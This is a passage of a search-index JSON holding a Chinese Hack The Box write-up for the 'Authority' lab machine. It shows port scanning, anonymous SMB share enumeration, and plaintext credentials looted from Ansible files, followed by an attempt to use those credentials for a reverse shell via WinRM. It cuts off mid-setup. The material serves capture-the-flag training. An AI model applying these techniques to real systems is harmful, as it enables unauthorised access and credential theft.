\u4e3b\u8981\u662f\u60f3\u5f04\u6e05\u4e3a\u4ec0\u4e48\u6253\u9776\u8fc7\u7a0b\u4e2d\u7528metasploit\u5931\u8d25\u4e86\uff0c\u4e4b\u524d\u7422\u78e8\u7740\u5e94\u8be5\u662f\u8981\u505a\u4e2a\u7aef\u53e3\u8f6c\u53d1\u3002\u5982\u679c\u60f3\u6cd5\u6b63\u786e\uff0c\u90a3\u4e48\u6b63\u597d\u53ef\u4ee5\u501f\u6b64\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u987a\u5e26\u7740\u628a\u7aef\u53e3\u8f6c\u53d1\u7684\u7406\u8bba\u77e5\u8bc6\u8f6c\u5316\u4e3a\u5b9e\u8df5\u3002 \u7ed3\u679c\u5b9e\u9a8c\u6210\u529f~</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Authority/","title":"HTB-Authority","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#_1","title":"\u626b\u63cf","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41</p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 09:52:17Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n8443/tcp  open  ssl/https-alt\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49687/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49690/tcp open  msrpc         Microsoft Windows RPC\n49699/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49713/tcp open  msrpc         Microsoft Windows RPC\n52705/tcp open  msrpc         Microsoft Windows RPC\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#_2","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>Windows\u9776\u673a\uff0c\u5f00\u4e8653\u300188\u7b49\u7aef\u53e3\u6240\u4ee5\u5e94\u8be5\u662f\u57df\u63a7\u2014\u2014\u5176\u5b9e\u4e00\u53f0Windows\u9776\u673a\u7684\u8bdd\u4e5f\u53ea\u80fd\u662f\u57df\u63a7\u4e86\u5427\uff0c\u4e0d\u7136\u4e5f\u6ca1\u5565\u6253\u7684\u4e86\u3002 \u4e00\u5171\u626b\u51fa29\u4e2a\u5f00\u653e\u7aef\u53e3\uff0c\u7a0d\u5fae\u5206\u4e00\u4e0b\u7c7b\u7136\u540e\u6309\u7167\u4f18\u5148\u5ea6\u6392\u4e00\u4e0b\uff1a</p> <ol> <li>SMB\uff1a139\uff0c445</li> <li>HTTP/S\uff1a80\uff0c\uff088443\uff09</li> <li>LDAP\uff1a389\uff0c636\uff0c\uff083268\uff0c3269\uff09</li> <li>RPC\uff1a135\uff0c\uff08593\uff09</li> <li>\u57df\u63a7\u76f8\u5173\uff1a53\uff0c88\uff0c\uff08464\uff09</li> <li>WinRM\uff1a5985</li> <li>\u6709\u4e00\u4e9b\u4e0d\u592a\u719f\u6089\uff1a464\uff0c593\uff0c3268\uff0c326\uff0c8443\uff0c9389<ul> <li>464\uff1aKerberos\u8fdb\u884c\u5bc6\u7801\u91cd\u8bbe\u7684\u7aef\u53e3</li> <li>593\uff1a\u539f\u6765ncacn_http\u662fRPC\u7684\u4e00\u4e2a\u534f\u8bae\u5e8f\u5217 RPC over HTTP</li> <li>3268\uff0c3269\uff1a\u4f3c\u4e4e\u662f\u7528\u4e8e\u5168\u5c40\u76ee\u5f55\uff08Global Catalog\uff09\u7684\u67e5\u8be2\u3002 \u5168\u5c40\u76ee\u5f55\u662fActive Directory\u4e2d\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u5b83\u5305\u542b\u4e86\u6240\u6709\u57df\u7684\u4e00\u90e8\u5206\u901a\u7528\u5c5e\u6027\u4fe1\u606f\uff0c\u65b9\u4fbf\u5728\u8de8\u57df\u67e5\u8be2\u65f6\u5feb\u901f\u8bbf\u95ee\u8fd9\u4e9b\u4fe1\u606f</li> <li>8443\uff1a\u641c\u7d22\u201cssl/https-alt\u201d\u53d1\u73b0\u8fd9\u4e2a\u8ba8\u8bba\u3002\u90a3\u4e488443\u5e94\u8be5\u4e5f\u7b97web\uff1f \"alt\" \u662f \"alternative\"\uff08\u66ff\u4ee3\uff09\u7684\u7b80\u5199\u5f62\u5f0f</li> <li>9389\uff1a\u4e0d\u592a\u61c2\uff0c\u59d1\u4e14\u641c\u5230MS\u6587\u6863</li> </ul> </li> <li>\u9ad8\u4f4d\u52a8\u6001\u7aef\u53e3\uff1a\u4f3c\u4e4e\u57fa\u672c\u90fd\u662fRPC\u76f8\u5173</li> </ol> <p>\u5173\u4e8e\u7acb\u8db3\u7684\u9884\u60f3\u8def\u5f84\uff1aSMB\u2014\u2014&gt;WEB (\u2014\u2014&gt;LDAP\u2014\u2014&gt;RPC) SMB\u63a2\u7d22\u7684\u4e1c\u897f\u5e94\u8be5\u4e0d\u591a\uff0c\u5148\u770b\u770b\u8fd9\u4e2a\u6536\u96c6\u4e00\u4e9b\u4fe1\u606f\u3002\u7136\u540e\u53ef\u4ee5\u770b\u770bweb\u7aef\u662f\u5426\u6709\u7a81\u7834\u53e3\u3002LDAP\u548cRPC\u7ecf\u9a8c\u4e0d\u8db3\uff0c\u611f\u89c9\u5982\u679cweb\u80fd\u7a81\u7834\u53ef\u80fd\u5c31\u4e0d\u9700\u8981\u540e\u9762\u4e86\u3002web\u65e0\u6cd5\u7a81\u7834\u7684\u8bdd\u53ef\u80fd\u6709\u57df\u51ed\u636e\u7136\u540e\u679a\u4e3eLDAP\uff1f\u83b7\u5f97\u51ed\u636e\u4e4b\u540e\u4f30\u8ba1\u53ef\u4ee5\u7528 <code>evil-winrm</code> \u5efa\u7acb\u8fde\u63a5\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#smb","title":"SMB\u63a2\u7d22","text":"<p>\u9996\u5148\u679a\u4e3eSMB\u5171\u4eab\uff1a <pre><code>\u2514\u2500$ smbclient -L //10.10.11.222/ -N            \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        Department Shares Disk      \n        Development     Disk      \n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share\n</code></pre></p> <p>\u5404\u4e2a\u5171\u4eab\u90fd\u8bd5\u8bd5\u65e0\u5bc6\u7801\u8fdb\u5165\u3002\u53d1\u73b0 <code>Development</code> \u8fd9\u4e2a\u5171\u4eab\u8d44\u6e90\u91cc\u6709\u4e00\u4e9b\u611f\u5174\u8da3\u7684\u4e1c\u897f\uff0c\u5168\u90e8\u62ff\u5230\u672c\u5730\u518d\u6162\u6162\u770b\uff1a <pre><code>\u2514\u2500$ smbclient //10.10.11.222/Development -N\nsmb: \\&gt; mask \"\"\nsmb: \\&gt; recurse ON\nsmb: \\&gt; prompt OFF\n#smb: \\&gt; cd 'path\\to\\remote\\dir'\n#smb: \\&gt; lcd '~/path/to/download/to/'\nsmb: \\&gt; mget *\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/Authority/SMB/Automation/Ansible]\n\u2514\u2500$ ls *    \nADCS:\ndefaults  meta      README.md         requirements.yml  tasks      tox.ini\nLICENSE   molecule  requirements.txt  SECURITY.md       templates  vars\n\nLDAP:\ndefaults  files  handlers  meta  README.md  tasks  templates  TODO.md  Vagrantfile  vars\n\nPWM:\nansible.cfg  ansible_inventory  defaults  handlers  meta  README.md  tasks  templates\n\nSHARE:\ntasks\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#development","title":"Development\u5171\u4eab\u7684\u6587\u4ef6\u5206\u6790","text":"<p>\u91cc\u9762\u662fansible\u7684\u51e0\u4e2a\u9879\u76ee\uff1f\u6b63\u597d\u81ea\u5df1\u6709\u4e86\u89e3\u4e00\u70b9ansible\u3002 \u6587\u4ef6\u4f3c\u4e4e\u6709\u70b9\u591a\uff0c\u6211\u4e00\u822c\u90fd\u4e60\u60ef\u4ece\u5c11\u7684\u5f00\u59cb\u770b\uff0c\u53ef\u4ee5\u5148\u770b\u5b8c\u4e00\u4e2a\u6ca1\u5565\u7528\u7684\u8bdd\u5c31\u4e22\u5f03\uff0c\u7136\u540e\u4e13\u6ce8\u5269\u4e0b\u7684\u6587\u4ef6\u591a\u7684\u4e1c\u897f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#share","title":"SHARE","text":"<p>\u6ca1\u5565\u6709\u7528\u7684\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#pwm","title":"PWM","text":"<ul> <li>README\u91cc\u9762\u63d0\u5230 <code>defaults/main.yml</code> \u7684\u51e0\u4e2a\u53d8\u91cf\uff0c\u770b\u53d8\u91cf\u540d\u5341\u5206\u654f\u611f\u3002\u7136\u540e\u641c\u4e86\u4e00\u4e0bPWM\uff0c\u4f3c\u4e4e\u662f\u4e00\u4e2a\u5bc6\u7801\u7ba1\u7406\u5de5\u5177\u3002<ul> <li>https://github.com/pwm-project/pwm</li> <li>https://opensource.com/article/19/4/automate-password-resets-pwm</li> </ul> </li> <li>cfg\u6587\u4ef6\u91cc\u53d1\u73b0\u4e00\u4e2a\u7528\u6237\uff1a<code>svc_pwm</code>\u3002</li> <li>inventory\u6587\u4ef6\u91cc\u914d\u7f6e\u4e86\u6e05\u5355\u53d8\u91cf\u3002\u6709ansible\u51ed\u636e\uff08<code>administrator:Welcome1</code>\uff09\uff0c\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7\u7aef\u53e35985\u7684winrm\u8fde\u63a5\u76ee\u6807\u3002</li> <li><code>defaults/main.yml</code> \u91cc\u9762\u67093\u7ec4\u7528ansible vault\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u53d8\u91cf\uff08<code>pwm_admin_login</code>\uff0c<code>pwm_admin_password</code>\uff0c<code>ldap_admin_password</code>\uff09\u3002</li> <li>tasks\u7684playbook\u50cf\u662f\u5728\u90e8\u7f72PWM\u8fd9\u4e2a\u5e94\u7528\uff0c\u5185\u5bb9\u5c31\u662fREADME\u63d0\u5230\u7684\u6b65\u9aa4\u3002\u91cc\u9762\u7528\u5230\u4e86template\u6765\u914d\u7f6eTomcat\u7684config\u3002</li> <li>Tomcat\u7684config\u91cc\u6709\u4e24\u7ec4\u51ed\u636e\uff0c\u7528\u9014\u4e0d\u660e\u3002<ul> <li><code>admin:T0mc@tAdm1n</code></li> <li><code>robot:T0mc@tR00t</code></li> </ul> </li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat ansible.cfg              \n[defaults]\n\nhostfile = ansible_inventory\nremote_user = svc_pwm\n\uff08\u7565\uff09\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat ansible_inventory\nansible_user: administrator\nansible_password: Welcome1\nansible_port: 5985\nansible_connection: winrm\nansible_winrm_transport: ntlm\nansible_winrm_server_cert_validation: ignore\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat defaults/main.yml      \n---\npwm_run_dir: \"{{ lookup('env', 'PWD') }}\"\n\npwm_hostname: authority.htb.corp\npwm_http_port: \"{{ http_port }}\"\npwm_https_port: \"{{ https_port }}\"\npwm_https_enable: true\n\npwm_require_ssl: false\n\npwm_admin_login: !vault |\n          $ANSIBLE_VAULT;1.1;AES256\n          32666534386435366537653136663731633138616264323230383566333966346662313161326239\n          6134353663663462373265633832356663356239383039640a346431373431666433343434366139\n          35653634376333666234613466396534343030656165396464323564373334616262613439343033\n          6334326263326364380a653034313733326639323433626130343834663538326439636232306531\n          3438\n\npwm_admin_password: !vault |\n          $ANSIBLE_VAULT;1.1;AES256\n          31356338343963323063373435363261323563393235633365356134616261666433393263373736\n          3335616263326464633832376261306131303337653964350a363663623132353136346631396662\n          38656432323830393339336231373637303535613636646561653637386634613862316638353530\n          3930356637306461350a316466663037303037653761323565343338653934646533663365363035\n          6531\n\nldap_uri: ldap://127.0.0.1/\nldap_base_dn: \"DC=authority,DC=htb\"\nldap_admin_password: !vault |\n          $ANSIBLE_VAULT;1.1;AES256\n          63303831303534303266356462373731393561313363313038376166336536666232626461653630\n          3437333035366235613437373733316635313530326639330a643034623530623439616136363563\n          34646237336164356438383034623462323531316333623135383134656263663266653938333334\n          3238343230333633350a646664396565633037333431626163306531336336326665316430613566\n          3764\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat tasks/main.yml\n\uff08\u7565\uff09\n- name: Configure Tomcat \n  template:\n    src: templates/tomcat-users.xml.j2\n    dest: C:\\Program Files\\Apache Software Foundation\\Tomcat 10.0\\conf\\tomcat-users.xml\n\uff08\u7565\uff09\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat templates/tomcat-users.xml.j2 \n&lt;?xml version='1.0' encoding='cp1252'?&gt;\n\n&lt;tomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\"\n version=\"1.0\"&gt;\n\n&lt;user username=\"admin\" password=\"T0mc@tAdm1n\" roles=\"manager-gui\"/&gt;  \n&lt;user username=\"robot\" password=\"T0mc@tR00t\" roles=\"manager-script\"/&gt;\n\n&lt;/tomcat-users&gt;\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#ldap","title":"LDAP","text":"<ul> <li>\u770b\u4e86\u773cREADME\uff0c\u8fd9\u4e2arole\u662f\u914d\u7f6eSSSD\u90e8\u7f72LDAP\u8ba4\u8bc1\u7528\u7684\u3002</li> <li>TODO\u6587\u4ef6\u91cc\u63d0\u5230\u66f4\u6539\u8fc7LDAP\u7684admin\u5bc6\u7801\uff0c\u90a3\u4e48\u4f30\u8ba1playbook\u91cc\u914d\u7f6e\u7684\u51ed\u636e\u5df2\u7ecf\u5931\u6548\u3002</li> <li>\u7ffb\u4e86\u4e00\u5708\u6ca1\u53d1\u73b0\u51ed\u636e\u7b49\u6709\u7528\u4fe1\u606f\u3002</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/LDAP]\n\u2514\u2500$ cat TODO.md \n- Change LDAP admin password after build -[COMPLETE]\n- add tests for ubuntu 14, 16, debian 7 and 8, and centos 6 and 7\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#adcs","title":"ADCS","text":"<ul> <li>\u770b\u4e86\u773cREADME\uff0c\u8fd9\u4e2arole\u662f\u914d\u7f6e\u201ccertificate authority\u201d\u7684\uff0c\u5e94\u8be5\u5c31\u5982\u6587\u4ef6\u5939\u540d\u6307\u7684\u662fADCS\u3002</li> <li><code>defaults/main.yml</code> \u91cc\u6709\u4e2a <code>ca_passphrase: SuP3rS3creT</code> \u4e0d\u77e5\u9053\u4ec0\u4e48\u7528\u9014\u3002\u8fd8\u6709\u4e00\u4e9b\u57df\u4fe1\u606f\u3002</li> <li>\u7a0d\u5fae\u626b\u4e86\u4e00\u773c\u5269\u4e0b\u7684\u6587\u4ef6\uff0c\u4f3c\u4e4e\u90fd\u662f\u90e8\u7f72\u7684\u52a8\u4f5c\uff0c\u6ca1\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\u3002</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/ADCS]\n\u2514\u2500$ cat defaults/main.yml   \n\uff08\u7565\uff09\n# A passphrase for the CA key.\nca_passphrase: SuP3rS3creT\n\n# The common name for the CA.\nca_common_name: authority.htb\n\n# Other details for the CA.\nca_country_name: NL\nca_email_address: admin@authority.htb\nca_organization_name: htb\nca_organizational_unit_name: htb\nca_state_or_province_name: Utrecht\nca_locality_name: Utrecht\n\uff08\u7565\uff09\n</code></pre> <p>\u7ec8\u4e8e\u770b\u5b8c\u8fd9\u4e00\u5806\u6587\u4ef6\uff0c\u6839\u636e\u4e0a\u9762\u7684\u4fe1\u606f\uff0c\u5e94\u8be5\u5c31PWM\u90a3\u4e2a\u6587\u4ef6\u5939\u91cc\u7684\u8f83\u6709\u7528\uff0c\u91cc\u9762\u6709\u8f83\u591a\u51ed\u636e\u4fe1\u606f\uff0c\u4e14\u6709\u51e0\u4e2a\u52a0\u5bc6\u4e86\u7684\u4e0d\u77e5\u9053\u80fd\u5426\u7834\u89e3\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#ansible","title":"Ansible","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#ansible_1","title":"\u5c1d\u8bd5\u642d\u5efaansible\u63a7\u5236\u7aef\u53d1\u653e\u547d\u4ee4\u6267\u884c","text":"<p>\u7531\u4e8eansible\u6e05\u5355\u6587\u4ef6\u91cc\u9762\u5305\u542b\u4e86ansible\u6267\u884c\u65f6\u7684\u8d26\u6237\u5bc6\u7801\uff0c\u4e8e\u662f\u5c1d\u8bd5\u80fd\u5426\u642d\u5efaansible\u63a7\u5236\u7aef\u53bb\u8fde\u63a5\u9776\u673a\uff0c\u5e76\u8ba9\u5176\u6267\u884c\u53cd\u5f39shell\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#pythonansible","title":"\u8e29\u5751\uff1aPython\u9ad8\u7248\u672c\u5b89\u88c5\u7684ansible\u5bfc\u81f4\u7684\u62a5\u9519","text":"<p>\u4e00\u5f00\u59cb\u76f4\u63a5\u7528kali\u5b89\u88c5ansible\uff0c\u5e76\u6839\u636e\u6587\u6863\u4f7f\u7528WinRM\u65f6\u9700\u8981\u5b89\u88c5pywinrm\uff1a<code>pip install \"pywinrm&gt;=0.3.0\"</code>\u3002</p> <p>\u4f46\u662f\u6267\u884c <code>ansible -i ansible_inventory HTB -m win_ping</code> \u6d4b\u8bd5\u65f6\u603b\u4f1a\u62a5\u9519\uff1a</p> <ul> <li>\u7528\u9776\u673a\u539f\u672c\u7684\u6e05\u5355\u6587\u4ef6\uff08ansible_inventory\uff0cINI\u683c\u5f0f\uff09\u65f6\uff1a\u62a5\u9519\u65e0\u6cd5\u8fde\u63a522\u7aef\u53e3\u3002</li> <li>\u53d1\u73b0\u4e0a\u9762\u62a5\u9519\u4e5f\u6709\u8bf4\u65e0\u6cd5\u89e3\u6790\u6e05\u5355\u6587\u4ef6\uff0c\u4e8e\u662f\u6539\u6210YAML\u683c\u5f0f\u540e\u8fd0\u884c\uff1a\u62a5\u9519\u201cntlm: module 'inspect' has no attribute 'getargspec'\u201d\u3002</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ ansible -i ansible_inventory HTB -m win_ping          \n[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with yaml\nplugin: We were unable to read either as JSON nor YAML, these are the errors we got from each: JSON: Expecting\nvalue: line 1 column 2 (char 1)  Syntax Error while loading YAML.   did not find expected &lt;document start&gt;  The\nerror appears to be in '/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory': line 2, column 1,\nbut may be elsewhere in the file depending on the exact syntax problem.  The offending line appears to be:  [HTB]\n10.10.11.222 ^ here\n[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with ini\nplugin: /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory:5: Expected key=value, got:\nansible_user: administrator\n[WARNING]: Unable to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory as an inventory\nsource\n[WARNING]: No inventory was parsed, only implicit localhost is available\n[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not\nmatch 'all'\n10.10.11.222 | UNREACHABLE! =&gt; {\n    \"changed\": false,\n    \"msg\": \"Data could not be sent to remote host \\\"10.10.11.222\\\". Make sure this host can be reached over ssh: ssh: connect to host 10.10.11.222 port 22: Connection refused\\r\\n\",                                                    \n    \"unreachable\": true\n}\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ ansible -i ansible_inventory.yml HTB -m win_ping    \n10.10.11.222 | UNREACHABLE! =&gt; {\n    \"changed\": false,\n    \"msg\": \"ntlm: module 'inspect' has no attribute 'getargspec'\",\n    \"unreachable\": true\n}\n</code></pre> <p>\u4e24\u6b21\u62a5\u9519\u4fe1\u606f\u4e0d\u4e00\u6837\u8fd8\u6709\u70b9\u8ff7\uff1f \u7ee7\u7eed\u641c\u7d22\u5982\u4f55\u4f7f\u7528ansible\u7ba1\u7406Windows\uff0c\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u540e\u7406\u89e3\u4e86\u4e00\u90e8\u5206\u62a5\u9519\u539f\u56e0\u3002\u603b\u7684\u6765\u8bf4\uff0cansible\u9ed8\u8ba4\u7528ssh\u8fde\u63a5\u3002 \u867d\u7136\u539f\u672cINI\u683c\u5f0f\u7684\u6e05\u5355\u6587\u4ef6\u91cc\u6709\u6307\u5b9a\u5bf9\u76ee\u6807\u4f7f\u7528WinRM\u8fde\u63a5\uff0c\u4f46\u662f\u7531\u4e8e\u6e05\u5355\u89e3\u6790\u5931\u8d25\uff0c\u6240\u4ee5\u8fd8\u662f\u4f7f\u7528\u4e86\u9ed8\u8ba4\u7684ssh\u8fde\u63a5\u65b9\u5f0f\uff0c\u800c22\u7aef\u53e3\u6211\u4eec\u4e5f\u6ca1\u626b\u51fa\u6765\u662f\u5f00\u653e\u7684\uff0c\u6240\u4ee5\u7ed3\u679c\u662f\u62a5\u951922\u7aef\u53e3\u7684ssh\u8fde\u63a5\u5931\u8d25\u3002 \u90a3\u4e48\u540e\u6765\u7528YAML\u6e05\u5355\u6267\u884c\u7684\u62a5\u9519\u624d\u662f\u8be5\u89e3\u51b3\u7684\u95ee\u9898\uff08\u6587\u7ae0\u91cc\u662f\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u53d8\u91cf\u4f7f\u7528WinRM\u7684\uff09\u3002</p> <p>\u5728\u8fd9\u4e4b\u524d\u987a\u4fbf\u786e\u8ba4\u4e86\u4e00\u4e0b\u6e05\u5355\u7684\u4e3b\u673a\u53d8\u91cf\u3002 \u786e\u5b9eINI\u683c\u5f0f\u7684\u6e05\u5355\u4f1a\u89e3\u6790\u5931\u8d25\u4e8e\u662f\u4ec0\u4e48\u90fd\u6ca1\u6709\uff0c\u800cYAML\u683c\u5f0f\u5219\u987a\u5229\u89e3\u6790\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ ansible-inventory -i ansible_inventory --list -y\n[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with yaml\nplugin: We were unable to read either as JSON nor YAML, these are the errors we got from each: JSON: Expecting\nvalue: line 1 column 2 (char 1)  Syntax Error while loading YAML.   did not find expected &lt;document start&gt;  The\nerror appears to be in '/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory': line 2, column 1,\nbut may be elsewhere in the file depending on the exact syntax problem.  The offending line appears to be:  [HTB]\n10.10.11.222 ^ here\n[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with ini\nplugin: /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory:5: Expected key=value, got:\nansible_user: administrator\n[WARNING]: Unable to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory as an inventory\nsource\n[WARNING]: No inventory was parsed, only implicit localhost is available\nall:\n  children:\n    ungrouped: {}\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ ansible-inventory -i ansible_inventory.yml --list -y \nall:\n  children:\n    HTB:\n      hosts:\n        10.10.11.222:\n          ansible_connection: winrm\n          ansible_password: Welcome1\n          ansible_port: 5985\n          ansible_user: administrator\n          ansible_winrm_server_cert_validation: ignore\n          ansible_winrm_transport: ntlm\n    ungrouped: {}\n</code></pre></p> <p>\u7ee7\u7eed\u6253\u9776\u3002</p> <p>\u7a0d\u5fae\u67e5\u4e86\u4e0bYAML\u6e05\u5355\u6267\u884c\u7684\u62a5\u9519\uff0c\u4f3c\u4e4e\u662f'getargspec'\u57283.11\u4e0d\u652f\u6301\u4e86\uff0c\u4e8e\u662f\u5c1d\u8bd5\u964dpython\u7248\u672c\u8fd0\u884c\u3002 \u5148\u5b89\u88c5\u4f4e\u7248\u672cpython\u3002\u4e0d\u8fc7\u914d\u7f6eansible\u7684python\u89e3\u91ca\u5668\u76f8\u5173\u53c2\u6570\u540e\uff0c\u8bd5\u4e86\u534a\u5929\u7528 <code>ansible --version</code> \u770bpython\u8def\u5f84\u90fd\u6ca1\u53d8\u5316\u3002\u67e5\u4e86\u67e5\u770b\u5230\u8fd9\u91cc\u3002\u539f\u6765\u6211\u66f4\u6539\u7684 <code>ansible.cfg</code> \u548c\u6e05\u5355\u53d8\u91cf\u90fd\u662f\u6307\u5b9a\u53d7\u63a7\u76ee\u6807host\u7684pyhton\u89e3\u91ca\u5668\uff0c\u800cansible\u662f\u4e00\u4e2apyhton\u5e93\uff0c\u63a7\u5236\u7aef\u7684python\u89e3\u91ca\u5668\u8def\u5f84\u5c31\u662f\u4f9d\u8d56\u4e8e\u5b89\u88c5ansible\u7684python\u7248\u672c\u3002\u8981\u66f4\u6539\u7684\u8bdd\u9700\u8981\u7528\u4f4e\u7248\u672cpython\u91cd\u88c5ansible\u3002\u5176\u5b9e\u5b98\u65b9\u6587\u6863\u4e5f\u6709\u63d0\u5230\u3002</p> <p>\u7136\u800c\u6211\u7684ansible\u662f\u4e4b\u524d\u7528apt\u88c5\u7684\u2026\u2026 \u73b0\u5728\u5c1d\u8bd5\u7528\u4f4e\u7248\u672cpython\u6309\u7167\u5b98\u65b9\u5b89\u88c5\u6587\u6863\u91cd\u88c5\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#python39","title":"\u964d\u7248\u672c\u5b89\u88c5python3.9","text":"<p>\u6d89\u53ca\u5230Python\u591a\u7248\u672c\u5171\u5b58\u7684\u95ee\u9898\uff0c\u7528\u5982\u4e0b\u65b9\u5f0f\u3002\u540e\u6765\u60f3\u60f3\u7528miniconda\u5e94\u8be5\u4e5f\u4e0d\u9519\uff1f <pre><code>cd ~\nsudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libsqlite3-dev libreadline-dev libffi-dev wget libbz2-dev\nwget https://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz\ntar -xf Python-3.9.7.tgz\ncd Python-3.9.7\n./configure --enable-optimizations\nmake -j$(nproc)\nsudo make altinstall\npython3.9 